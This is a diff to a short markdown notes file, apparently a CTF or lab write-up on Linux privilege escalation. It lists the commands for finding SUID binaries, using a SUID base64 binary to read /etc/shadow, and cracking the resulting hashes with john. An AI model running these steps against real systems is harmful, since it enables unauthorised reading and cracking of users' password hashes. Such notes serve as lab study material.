@@ -163,5 +163,12 @@ To exploit SUID we need to find if any of the programs are wrongly configured, r
 `find / -type f -perm -04000 -ls 2>/dev/null`
 In this case, Base64
 Check GTFOBins
-`LFILE=/etc/shadow
-`/bin/base64 "$LFILE" | base64 --decode`
+```sh
+LFILE=/etc/shadow
+/bin/base64 "$LFILE" | base64 --decode
+```
+## Store hash and decrypt 
+Store it on a txt and:
+```sh
+john file.txt
+```
